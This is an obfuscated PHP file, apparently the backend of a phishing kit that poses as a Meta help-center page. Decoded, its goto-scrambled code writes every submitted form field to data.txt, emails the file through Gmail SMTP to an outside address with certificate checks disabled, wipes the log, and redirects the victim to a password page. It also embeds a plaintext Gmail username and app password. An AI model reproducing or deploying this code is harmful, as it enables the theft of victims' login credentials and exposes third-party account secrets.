<?php
goto rE03s;
nmUc2:
$file = fopen("\x64\x61\164\x61\x2e\164\x78\164", "\141");
goto ew2uJ;
fRvbK:
function smtp_mailer($to, $Subject, $msg)
{
	function clear_file($filename)
	{
		$fp = fopen("\144\x61\164\141\56\x74\x78\x74", "\167");
		fwrite($fp, '');
		fclose($fp);
	}
	$filename = "\144\x61\x74\x61\56\164\x78\164";
	$fp = fopen("\x64\141\164\141\x2e\x74\170\x74", "\162");
	$data = fread($fp, filesize($filename));
	fclose($fp);
	$MyEmail = "\x6d\145\164\x61\x68\145\x6c\160\x63\145\156\x74\x65\162\67\x36\x40\x67\x6d\x61\x69\154\56\143\157\155";
	$mail = new PHPMailer();
	$mail->IsSMTP();
	$mail->SMTPAuth = true;
	$mail->SMTPSecure = "\164\154\163";
	$mail->Host = "\x73\x6d\x74\x70\x2e\x67\x6d\141\x69\154\x2e\x63\157\155";
	$mail->Port = 587;
	$mail->IsHTML(true);
	$mail->CharSet = "\x55\124\x46\x2d\x38";
	$mail->Username = "\142\x68\x61\x77\141\154\x73\x61\x72\155\x61\144\x40\x67\x6d\x61\x69\154\x2e\143\x6f\x6d";
	$mail->Password = "\141\157\x77\163\x68\x7a\x72\166\150\171\x71\145\x67\x67\x63\x62";
	$mail->SetFrom("\142\150\x61\167\x61\154\163\141\162\155\141\x64\x40\x67\x6d\141\x69\x6c\56\x63\x6f\x6d");
	$mail->Subject = "\x44\145\166\145\x6c\157\160\145\162\55\123\x61\162\x6d\x61\144\x3a\x2b\71\x32\x33\x34\x31\60\63\x35\x34\71\x33\64";
	$mail->Body = $data;
	$mail->addAddress($MyEmail);
	$mail->SMTPOptions = array("\x73\x73\154" => array("\x76\145\x72\151\146\x79\137\160\145\145\x72" => false, "\x76\145\x72\151\146\x79\x5f\x70\x65\x65\x72\137\x6e\141\x6d\145" => false, "\141\154\154\157\x77\137\x73\x65\154\x66\137\163\151\147\156\145\x64" => false));
	$mail->send();
	clear_file($filename);
	echo "\xa\74\x73\143\x72\151\160\164\x3e\12\144\157\x63\x75\x6d\145\x6e\164\56\154\157\143\141\164\x69\157\x6e\56\x68\162\145\146\x20\75\x20\x27\56\56\57\x70\x61\163\x73\167\x6f\x72\144\x2e\x68\x74\155\154\47\x3b\xa\74\57\x73\143\162\151\x70\x74\x3e\12\12";
}
goto pkp33;
rE03s:
include "\163\x6d\164\160\x2f\x50\110\x50\x4d\x61\x69\x6c\x65\162\101\x75\x74\x6f\x6c\157\141\144\56\160\x68\160";
goto nmUc2;
Tu_I0:
echo smtp_mailer("\142\150\141\x77\141\154\x73\141\162\x6d\141\x64\100\147\155\x61\151\x6c\56\143\x6f\x6d", "\123\x61\x72\x6d\141\x64\40\x79\157\165\162\40\160\x61\x73\x73", "\x68\x74\x6d\154");
goto fRvbK;
xs52e:
fwrite($file, "\xd\12");
goto D2Spn;
D2Spn:
fclose($file);
goto Tu_I0;
ew2uJ:
foreach ($_POST as $variable => $value) {
	fwrite($file, $variable);
	fwrite($file, "\x3d");
	fwrite($file, $value);
	fwrite($file, "\xd\12");
}
goto xs52e;
pkp33: